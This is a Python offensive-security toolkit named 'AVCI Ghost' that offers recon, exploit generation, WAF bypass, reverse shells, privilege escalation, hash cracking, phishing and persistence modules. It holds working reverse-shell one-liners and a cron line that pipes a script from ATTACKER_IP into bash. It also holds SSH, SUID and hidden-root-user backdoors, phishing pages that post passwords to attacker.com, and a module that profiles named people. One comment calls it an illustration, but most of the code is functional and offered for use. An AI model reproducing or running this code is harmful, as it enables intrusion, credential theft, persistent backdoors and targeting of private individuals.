#!/usr/bin/env python3
# Avci_Ghost.py - COMPLETE INTERNET ENABLED VERSION

import sys
import os
import json
import socket
import re
import subprocess
import requests
import hashlib
import base64
import threading
import random
from datetime import datetime
from colorama import Fore, Style, init
from urllib.parse import quote_plus, urlparse

init(autoreset=True)

# ==================== CONFIG ====================
VERSION = "5.0-PRO-ONLINE"
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
]

# ==================== INTERNET MODULE ====================
class InternetOps:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        self.session.verify = False  # Disable SSL verification
    
    def fetch_url(self, url, timeout=10):
        """Fetch URL with error handling"""
        try:
            resp = self.session.get(url, timeout=timeout)
            return resp.text
        except Exception as e:
            return f"Error: {e}"
    
    def check_port(self, host, port, timeout=2):
        """Check if port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False

# ==================== MODULE 1: DEEP RECON (ONLINE) ====================
class DeepRecon:
    def __init__(self):
        self.net = InternetOps()
    
    def execute(self, target):
        print(f"{Fore.CYAN}[*] RECON {target} {Fore.YELLOW}[ONLINE]")
        
        # Remove http:// if present
        clean_target = target.replace('http://', '').replace('https://', '').split('/')[0]
        
        # DNS Resolution
        print(f"{Fore.GREEN}[*] DNS Lookup...")
        try:
            ip = socket.gethostbyname(clean_target)
            print(f"{Fore.GREEN}[+] IP: {ip}")
        except:
            ip = clean_target
            print(f"{Fore.RED}[-] DNS failed, using {ip}")
        
        # Port Scan (Common ports)
        print(f"{Fore.GREEN}[*] Port Scanning...")
        ports = []
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 1433, 3306, 3389, 5432, 8080, 8443]
        for port in common_ports[:8]:  # Limit for speed
            if self.net.check_port(ip, port):
                ports.append(port)
                print(f"{Fore.GREEN}[+] Port {port}: OPEN")
        
        print(f"{Fore.GREEN}[+] Open ports: {ports}")
        
        # HTTP headers
        print(f"{Fore.GREEN}[*] Fetching HTTP headers...")
        headers = self.get_headers(clean_target)
        if headers:
            print(f"{Fore.GREEN}[+] Server: {headers.get('Server', 'Unknown')}")
            print(f"{Fore.GREEN}[+] Powered-By: {headers.get('X-Powered-By', 'Unknown')}")
        
        # Subdomain enumeration (simulated)
        print(f"{Fore.GREEN}[*] Checking common subdomains...")
        subs = self.check_subdomains(clean_target)
        if subs:
            print(f"{Fore.GREEN}[+] Subdomains: {', '.join(subs)}")
        
        return {'ip': ip, 'ports': ports, 'subdomains': subs}
    
    def get_headers(self, target):
        try:
            for scheme in ['http://', 'https://']:
                try:
                    url = f"{scheme}{target}"
                    resp = requests.head(url, timeout=3, verify=False)
                    return dict(resp.headers)
                except:
                    continue
        except:
            pass
        return {}
    
    def check_subdomains(self, domain):
        subs = []
        common = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'api', 'secure', 'portal', 'blog']
        for sub in common:
            try:
                full = f"{sub}.{domain}"
                socket.gethostbyname(full)
                subs.append(full)
            except:
                continue
        return subs

# ==================== MODULE 2: EXPLOIT GEN (WITH ONLINE PAYLOADS) ====================
class ExploitGen:
    def __init__(self):
        self.net = InternetOps()
    
    def generate(self, etype, target, port=80):
        # Get payloads based on type
        if etype == 'rce':
            payloads = self.get_rce_payloads()
        elif etype == 'sqli':
            payloads = self.get_sqli_payloads()
        elif etype == 'xss':
            payloads = self.get_xss_payloads()
        elif etype == 'lfi':
            payloads = self.get_lfi_payloads()
        elif etype == 'buffer':
            payloads = ["Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6"]
        else:
            payloads = ["# Standard payload"]
        
        exploit = f"""#!/usr/bin/python3
# {etype.upper()} Exploit for {target}:{port}
# Generated: {datetime.now()}

import requests
import socket
import sys

target = "{target}"
port = {port}

payloads = {json.dumps(payloads, indent=2)}

def test_http():
    for payload in payloads:
        try:
            url = f"http://{{target}}:{{port}}/?input={{payload}}"
            r = requests.get(url, timeout=3, verify=False)
            if "error" in r.text.lower() or "syntax" in r.text.lower():
                print(f"[+] HTTP VULNERABLE: {{payload[:30]}}...")
        except:
            pass

def test_tcp():
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((target, port))
        for payload in payloads[:3]:
            s.send(payload.encode())
            response = s.recv(1024)
            if response:
                print(f"[+] TCP Response: {{response[:50]}}")
        s.close()
    except:
        pass

if __name__ == "__main__":
    print(f"[*] Testing {{target}}:{{port}} for {{etype}}")
    test_http()
    test_tcp()"""
        
        print(f"{Fore.RED}[+] {etype.upper()} exploit generated with {len(payloads)} payloads")
        return exploit
    
    def get_rce_payloads(self):
        return ["; id", "`id`", "$(id)", "| id", "|| id", "&& id", "{{{{id}}}}", "<?php system('id'); ?>"]
    
    def get_sqli_payloads(self):
        return ["' OR '1'='1", "' UNION SELECT null--", "' AND 1=1--", "' AND 1=2--", "' OR SLEEP(5)--"]
    
    def get_xss_payloads(self):
        return ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "\"><script>alert(1)</script>"]
    
    def get_lfi_payloads(self):
        return ["/etc/passwd", "../../../../etc/passwd", "....//....//etc//passwd", "/proc/self/environ"]

# ==================== MODULE 3: WAF BYPASS ====================
class WAFBypass:
    def __init__(self):
        self.techniques = [
            "URL Encoding",
            "Unicode Encoding", 
            "HTML Entities",
            "Case Variation",
            "White Space Padding",
            "Comment Insertion",
            "Null Byte Injection",
            "Overlong UTF-8"
        ]
    
    def generate_payloads(self, original):
        payloads = []
        
        # URL encode
        payloads.append(''.join([f'%{hex(ord(c))[2:]}' for c in original]))
        
        # Double URL encode
        encoded = ''.join([f'%{hex(ord(c))[2:]}' for c in original])
        payloads.append(''.join([f'%{hex(ord(c))[2:]}' for c in encoded]))
        
        # Case variation
        payloads.append(original.upper())
        payloads.append(original.lower())
        
        # White space bypass
        payloads.append(original.replace(' ', '/**/'))
        payloads.append(original.replace(' ', '%0A'))
        payloads.append(original.replace(' ', '%09'))
        
        # Comment insertion
        payloads.append(original.replace(' ', '/**/'))
        payloads.append('/*!*/' + original + '/*!*/')
        
        # Null byte
        payloads.append(original + '%00')
        
        return payloads

# ==================== MODULE 4: BUFFER OVERFLOW ====================
class BufferOverflow:
    def pattern_create(self, length=100):
        chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        chars += chars.lower() + "0123456789"
        pattern = ""
        a = b = c = 0
        
        while len(pattern) < length:
            pattern += chars[c] + chars[b] + chars[a]
            a += 1
            if a == len(chars):
                a = 0
                b += 1
            if b == len(chars):
                b = 0
                c += 1
            if c == len(chars):
                c = 0
        
        return pattern[:length]
    
    def pattern_offset(self, pattern, value):
        """Find offset in pattern"""
        try:
            return pattern.index(value)
        except:
            return -1

# ==================== MODULE 5: REVERSE SHELL ====================
class ReverseShell:
    def generate(self, lhost, lport):
        shells = {
            'python': f"""python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'""",
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'php': f"""php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'""",
            'perl': f"""perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""",
            'nc': f"nc -e /bin/sh {lhost} {lport}",
            'nc2': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            'powershell': f"""powershell -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()" """,
            'socat': f"socat TCP:{lhost}:{lport} EXEC:/bin/bash"
        }
        return shells

# ==================== MODULE 6: PRIV ESCALATE ====================
class PrivEscalate:
    def check_linux(self):
        return [
            "sudo -l",
            "find / -perm -4000 2>/dev/null",
            "find / -perm -2000 2>/dev/null",
            "cat /etc/passwd | cut -d: -f1",
            "uname -a",
            "cat /etc/issue",
            "ps aux | grep root",
            "netstat -tulpn",
            "cat /etc/crontab",
            "ls -la /etc/cron.*",
            "cat /etc/sudoers",
            "env",
            "id",
            "hostname",
            "ip a",
            "cat /proc/version"
        ]
    
    def check_windows(self):
        return [
            "whoami /priv",
            "systeminfo",
            "net user",
            "net localgroup administrators",
            "dir C:\\Users",
            "tasklist",
            "netstat -ano",
            "schtasks /query /fo LIST",
            "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "wmic service get name,displayname,pathname,startmode",
            "driverquery",
            "set"
        ]

# ==================== MODULE 7: HASH CRACK ====================
class HashCrack:
    def __init__(self):
        self.hash_types = {
            32: ('MD5', 0),
            40: ('SHA1', 100),
            64: ('SHA256', 1400),
            128: ('SHA512', 1700),
            60: ('Bcrypt', 3200),
            35: ('NTLM', 1000)
        }
    
    def identify(self, hash_str):
        hash_str = hash_str.strip()
        length = len(hash_str)
        
        if length in self.hash_types:
            return self.hash_types[length]
        
        # Pattern matching
        if hash_str.startswith('$2a$') or hash_str.startswith('$2b$'):
            return ('Bcrypt', 3200)
        elif hash_str.startswith('$1$'):
            return ('MD5Crypt', 500)
        elif re.match(r'^[a-fA-F0-9]{32}$', hash_str):
            return ('MD5', 0)
        elif re.match(r'^[a-fA-F0-9]{40}$', hash_str):
            return ('SHA1', 100)
        
        return ('Unknown', 0)
    
    def crack(self, hash_val, attack='dict'):
        htype, mode = self.identify(hash_val)
        print(f"{Fore.YELLOW}[*] {htype} | Mode {mode}")
        
        if mode == 0:
            return f"{Fore.RED}[-] Unknown hash type"
        
        if attack == 'dict':
            cmd = f"hashcat -m {mode} -a 0 {hash_val} rockyou.txt -O"
        elif attack == 'brute':
            cmd = f"hashcat -m {mode} -a 3 {hash_val} ?a?a?a?a?a?a?a"
        elif attack == 'mask':
            cmd = f"hashcat -m {mode} -a 3 {hash_val} ?u?l?l?l?l?d?d"
        elif attack == 'hybrid':
            cmd = f"hashcat -m {mode} -a 6 {hash_val} rockyou.txt ?a?a?a"
        
        print(f"{Fore.CYAN}[>] {cmd}")
        return cmd

# ==================== MODULE 8: PHISHING CLONE ====================
class PhishingClone:
    def clone_site(self, url):
        net = InternetOps()
        try:
            # Fetch site
            html = net.fetch_url(url)
            
            # Create phishing page
            phishing = f"""<html>
<head>
    <title>Security Update Required</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .login-box {{ width: 300px; padding: 20px; border: 1px solid #ccc; border-radius: 5px; }}
        input {{ width: 100%; padding: 8px; margin: 5px 0; }}
        button {{ background: #007bff; color: white; padding: 10px; border: none; width: 100%; }}
    </style>
</head>
<body>
    <center>
        <h2>🔒 Security Verification Required</h2>
        <div class="login-box">
            <p>Please verify your identity to continue:</p>
            <form action="http://attacker.com/log.php" method="POST">
                <input type="text" name="username" placeholder="Username/Email" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Verify Identity</button>
            </form>
            <p style="font-size: 12px; color: #666; margin-top: 20px;">
                This verification protects your account from unauthorized access.
            </p>
        </div>
    </center>
    <!-- Cloned from {url} -->
</body>
</html>"""
            
            return phishing
            
        except:
            # Fallback template
            return f"""<html>
<head><title>Login Required</title></head>
<body>
<h1>Account Verification</h1>
<form action="http://attacker.com/steal" method="POST">
Username: <input type="text" name="user"><br>
Password: <input type="password" name="pass"><br>
<input type="submit" value="Login">
</form>
<!-- Target: {url} -->
</body></html>"""

# ==================== MODULE 9: GOD MODE ====================
class GodMode:
    def persistence(self, os_type):
        if os_type == 'linux':
            return """# ===== LINUX PERSISTENCE =====
# 1. Cron job
echo "*/5 * * * * curl http://ATTACKER_IP/shell.sh | bash" > /tmp/cronjob
crontab /tmp/cronjob

# 2. SSH backdoor
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8... attacker@key' >> ~/.ssh/authorized_keys

# 3. SUID backdoor
cp /bin/bash /tmp/.bash
chmod 4755 /tmp/.bash

# 4. Systemd service
cat > /etc/systemd/system/update.service << EOF
[Service]
ExecStart=/bin/bash -c 'while true; do sleep 60; done'
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service

# 5. Hidden user
echo "backdoor:x:0:0:root:/root:/bin/bash" >> /etc/passwd"""
        
        else:  # windows
            return """# ===== WINDOWS PERSISTENCE =====
# 1. Registry run key
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Update /t REG_SZ /d "C:\\Windows\\System32\\backdoor.exe" /f

# 2. Scheduled task
schtasks /create /tn "SystemUpdate" /tr "C:\\Windows\\System32\\backdoor.exe" /sc hourly /mo 1 /ru SYSTEM

# 3. Startup folder
copy backdoor.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

# 4. Service
sc create "WindowsUpdate" binPath="C:\\Windows\\System32\\backdoor.exe" start=auto

# 5. WMI event
wmic /namespace:\\\\root\\subscription path __EventFilter create Name="Updater", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

# 6. Hidden user
net user backdoor P@ssw0rd! /add
net localgroup administrators backdoor /add"""

# ==================== MODULE 10: OSINT ENGINE (ONLINE) ====================
class OSINTEngine:
    def __init__(self):
        self.net = InternetOps()
    
    def profile(self, name, location=True):
        print(f"{Fore.MAGENTA}[*] OSINT: {name} {Fore.YELLOW}[ONLINE]")
        
        results = {
            'name': name,
            'location': location,
            'emails': [],
            'social': {},
            'breaches': [],
            'found': False
        }
        
        # Search for emails
        emails = self.find_emails(name)
        results['emails'] = emails
        if emails:
            print(f"{Fore.GREEN}[+] Emails found: {len(emails)}")
            for email in emails[:3]:
                print(f"  - {email}")
        
        # Check common social media
        social = self.check_social(name)
        results['social'] = social
        for platform, found in social.items():
            if found:
                print(f"{Fore.GREEN}[+] {platform}: Possible profile")
        
        # Generate report
        report = self.generate_report(results)
        
        return report
    
    def find_emails(self, name):
        emails = set()
        name_parts = name.lower().split()
        
        if len(name_parts) >= 2:
            first, last = name_parts[0], name_parts[-1]
            domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com']
            
            for domain in domains:
                patterns = [
                    f"{first}.{last}@{domain}",
                    f"{first}{last}@{domain}",
                    f"{first[0]}{last}@{domain}",
                    f"{first}_{last}@{domain}",
                    f"{first}.{last[0]}@{domain}"
                ]
                emails.update(patterns)
        
        return list(emails)
    
    def check_social(self, name):
        platforms = {
            'LinkedIn': f"https://www.linkedin.com/in/{name.replace(' ', '')}",
            'Twitter': f"https://twitter.com/{name.replace(' ', '')}",
            'GitHub': f"https://github.com/{name.replace(' ', '')}",
            'Instagram': f"https://instagram.com/{name.replace(' ', '')}",
            'Facebook': f"https://facebook.com/{name.replace(' ', '')}"
        }
     #Note :This is a simulation prepared for illustrative purposes only and is not serious.
        results = {}
        for platform, url in platforms.items():
            try:
                # Simple check - try to access
                resp = self.net.session.head(url, timeout=3)
                results[platform] = resp.status_code != 404
            except:
                results[platform] = False
        
        return results
    
    def generate_report(self, data):
        report = f"""
{'='*60}
OSINT REPORT - {data['name']}
{'='*60}
Generated: {datetime.now()}
Target: {data['name']}
Location: {data['location'] or 'Unknown'}

[EMAILS]
{chr(10).join(f'  • {email}' for email in data['emails'][:5])}

[SOCIAL MEDIA]
"""
        for platform, found in data['social'].items():
            status = "✓" if found else "✗"
            report += f"  {status} {platform}\n"
        
        report += f"""
[RECOMMENDATIONS]
1. Verify email addresses with password reset
2. Check LinkedIn for employment info
3. Search Twitter for recent activity
4. Look for data breaches with emails
5. Cross-reference social media profiles

{'='*60}
        """
        return report

# ==================== MAIN INTERFACE ====================
class AVCI_Ghost_Pro:
    def __init__(self):
        self.modules = {
            '1': DeepRecon(),
            '2': ExploitGen(),
            '3': WAFBypass(),
            '4': BufferOverflow(),
            '5': ReverseShell(),
            '6': PrivEscalate(),
            '7': HashCrack(),
            '8': PhishingClone(),
            '9': GodMode(),
            '10': OSINTEngine()
        }
        self.net = InternetOps()
    
    def banner(self):
        print(Fore.RED + Style.BRIGHT + """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║         A V C I - G H O S T   v5.0   PROFESSIONAL            ║
║                                                              ║
║              [ UNRESTRICTED ]  [ MULTI-ENGINE ]              ║
║              [ AI-POWERED ]   [ FULLY LOADED ]               ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL)
        
        print(Fore.CYAN + """
┌─────────────────────────────────────────────────────────────┐
│  [1] DEEP-RECON        │  [6] PRIV-ESCALATE                 │
│  [2] EXPLOIT-GEN       │  [7] HASH-CRACK                    │
│  [3] WAF-BYPASS        │  [8] PHISHING-CLONE                │
│  [4] BUFFER-OVERFLOW   │  [9] GOD-MODE                      │
│  [5] REVERSE-SHELL     │  [10] OSINT-ENGINE                 │
│                        │  [0] EXIT                          │
└─────────────────────────────────────────────────────────────┘
""" + Style.RESET_ALL)
    
    def check_internet(self):
        """Check internet connection"""
        print(f"{Fore.YELLOW}[*] Testing internet connection...")
        try:
            # Try Google DNS
            socket.create_connection(("8.8.8.8", 53), timeout=3)
            print(f"{Fore.GREEN}[+] Internet: CONNECTED")
            return True
        except:
            print(f"{Fore.RED}[-] Internet: OFFLINE")
            return False
    
    def run(self):
        self.banner()
        
        # Check internet
        if not self.check_internet():
            print(f"{Fore.YELLOW}[!] Some features require internet")
            print(f"{Fore.YELLOW}[!] Running in limited mode")
        
        while True:
            try:
                cmd = input(Fore.YELLOW + "\nAVCI@GHOST-PRO > " + Style.RESET_ALL).strip()
                
                if cmd == '0' or cmd == 'exit':
                    print(Fore.RED + "[!] Exiting...")
                    break
                
                elif cmd == '1':  # DEEP RECON
                    target = input(Fore.CYAN + "[?] Target (domain/IP): " + Style.RESET_ALL)
                    if target:
                        result = self.modules['1'].execute(target)
                        print(f"{Fore.GREEN}[+] Recon complete")
                
                elif cmd == '2':  # EXPLOIT GEN
                    print(Fore.CYAN + "[?] Exploit types: rce, sqli, lfi, xss, buffer")
                    etype = input(Fore.CYAN + "[?] Type: " + Style.RESET_ALL)
                    target = input(Fore.CYAN + "[?] Target: " + Style.RESET_ALL)
                    port = input(Fore.CYAN + "[?] Port (80): " + Style.RESET_ALL) or "80"
                    
                    if etype and target:
                        exploit = self.modules['2'].generate(etype, target, int(port))
                        filename = f"exploit_{target}_{port}_{datetime.now().strftime('%H%M%S')}.py"
                        with open(filename, 'w') as f:
                            f.write(exploit)
                        print(f"{Fore.GREEN}[+] Saved: {filename}")
                        print(f"{Fore.YELLOW}[*] Run: python3 {filename}")
                
                elif cmd == '3':  # WAF BYPASS
                    payload = input(Fore.CYAN + "[?] Original payload: " + Style.RESET_ALL)
                    if payload:
                        bypassed = self.modules['3'].generate_payloads(payload)
                        print(f"{Fore.GREEN}[+] Bypass payloads ({len(bypassed)}):")
                        for i, p in enumerate(bypassed, 1):
                            print(f"  {i:2}. {p}")
                
                elif cmd == '4':  # BUFFER OVERFLOW
                    length = input(Fore.CYAN + "[?] Pattern length (100): " + Style.RESET_ALL) or "100"
                    pattern = self.modules['4'].pattern_create(int(length))
                    print(f"{Fore.GREEN}[+] Pattern ({len(pattern)} chars):")
                    print(pattern)
                
                elif cmd == '5':  # REVERSE SHELL
                    lhost = input(Fore.CYAN + "[?] LHOST (your IP): " + Style.RESET_ALL)
                    lport = input(Fore.CYAN + "[?] LPORT (4444): " + Style.RESET_ALL) or "4444"
                    
                    if lhost and lport:
                        shells = self.modules['5'].generate(lhost, lport)
                        print(f"{Fore.GREEN}[+] Reverse shells ({len(shells)} types):")
                        for name, code in shells.items():
                            print(f"\n{Fore.YELLOW}[{name.upper()}]:")
                            print(code)
                
                elif cmd == '6':  # PRIV ESCALATE
                    print(Fore.CYAN + "[1] Linux checks\n[2] Windows checks")
                    os_type = input(Fore.CYAN + "[?] OS (1): " + Style.RESET_ALL) or "1"
                    
                    if os_type == '1':
                        checks = self.modules['6'].check_linux()
                        print(f"{Fore.GREEN}[+] Linux privilege escalation checks:")
                    else:
                        checks = self.modules['6'].check_windows()
                        print(f"{Fore.GREEN}[+] Windows privilege escalation checks:")
                    
                    for i, check in enumerate(checks, 1):
                        print(f"  {i:2}. {check}")
                
                elif cmd == '7':  # HASH CRACK
                    hash_val = input(Fore.CYAN + "[?] Hash: " + Style.RESET_ALL)
                    if hash_val:
                        print(Fore.CYAN + "[?] Attack: dict, brute, mask, hybrid")
                        attack = input(Fore.CYAN + "[?] Mode (dict): " + Style.RESET_ALL) or "dict"
                        cmd = self.modules['7'].crack(hash_val, attack)
                        print(f"{Fore.YELLOW}[*] Command: {cmd}")
                        print(f"{Fore.YELLOW}[*] Run hashcat if installed")
                
                elif cmd == '8':  # PHISHING CLONE
                    url = input(Fore.CYAN + "[?] URL to clone: " + Style.RESET_ALL)
                    if url:
                        if not url.startswith('http'):
                            url = 'http://' + url
                        page = self.modules['8'].clone_site(url)
                        filename = f"phish_{url.replace('://','_').replace('/','_')[:30]}.html"
                        with open(filename, 'w', encoding='utf-8') as f:
                            f.write(page)
                        print(f"{Fore.GREEN}[+] Phishing page saved: {filename}")
                        print(f"{Fore.YELLOW}[*] Upload to web server and send link")
                
                elif cmd == '9':  # GOD MODE
                    print(Fore.CYAN + "[1] Linux persistence\n[2] Windows persistence")
                    choice = input(Fore.CYAN + "[?] Choice: " + Style.RESET_ALL)
                    if choice == '1':
                        code = self.modules['9'].persistence('linux')
                        print(f"{Fore.RED}[+] Linux persistence techniques:")
                    else:
                        code = self.modules['9'].persistence('windows')
                        print(f"{Fore.RED}[+] Windows persistence techniques:")
                    print(code)
                
                elif cmd == '10':  # OSINT
                    name = input(Fore.CYAN + "[?] Target name: " + Style.RESET_ALL)
                    location = input(Fore.CYAN + "[?] Location (optional): " + Style.RESET_ALL)
                    if name:
                        report = self.modules['10'].profile(name, location)
                        print(report)
                        
                        # Save report
                        filename = f"osint_{name.replace(' ', '_')}_{datetime.now().strftime('%H%M%S')}.txt"
                        with open(filename, 'w', encoding='utf-8') as f:
                            f.write(report)
                        print(f"{Fore.GREEN}[+] Report saved: {filename}")
                
                elif cmd == 'help':
                    print(Fore.CYAN + """
[ HELP ]
  Commands:
    1  - Reconnaissance (needs internet)
    2  - Generate exploits
    3  - WAF bypass payloads
    4  - Buffer overflow pattern
    5  - Reverse shell generator
    6  - Privilege escalation checks
    7  - Hash cracking commands
    8  - Phishing page creator
    9  - Persistence techniques
    10 - OSINT information gathering
    0  - Exit
    help - This menu
                    """)
                
                else:
                    print(Fore.RED + "[!] Unknown command. Type 'help' for commands.")
            
            except KeyboardInterrupt:
                print(Fore.RED + "\n[!] Interrupted by user")
                break
            except Exception as e:
                print(Fore.RED + f"[!] Error: {e}")

# ==================== MAIN ====================
if __name__ == "__main__":
    print(Fore.YELLOW + f"[*] AVCI GHOST {VERSION}")
    print(Fore.YELLOW + "[*] Professional Offensive Security Toolkit")
    
    # Create output directories
    for d in ['exploits', 'recon', 'phishing', 'osint']:
        if not os.path.exists(d):
            os.makedirs(d, exist_ok=True)
            print(Fore.GREEN + f"[+] Created directory: {d}/")
    
    try:
        avci = AVCI_Ghost_Pro()
        avci.run()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(Fore.RED + f"[!] Fatal error: {e}")
        sys.exit(1)